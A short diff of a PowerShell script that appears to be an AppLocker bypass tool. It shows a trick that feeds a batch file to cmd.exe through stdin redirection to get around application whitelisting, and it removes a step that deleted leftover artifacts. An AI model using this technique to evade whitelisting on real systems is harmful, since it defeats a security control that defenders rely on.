@@ -355,12 +355,7 @@ If($TestBat -Match '\\'){
    Start-Sleep -Seconds 1;Write-Host "[+] script output:`n`n"
    ## Nice trick to be abble to execute cmd stdin { < } on PS
    Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < $Bypassext"
-
-   cd $Working_Directory
-   ## Delete ALL artifacts left behind
-   If(Test-Path -Path "$RawFullPath"){
-      Remove-Item -Path "$RawFullPath" -Force
-   }
+   cd $Working_Directory ## return to applocker working directory
 
 Write-Host ""
 exit ## Exit @AppLocker
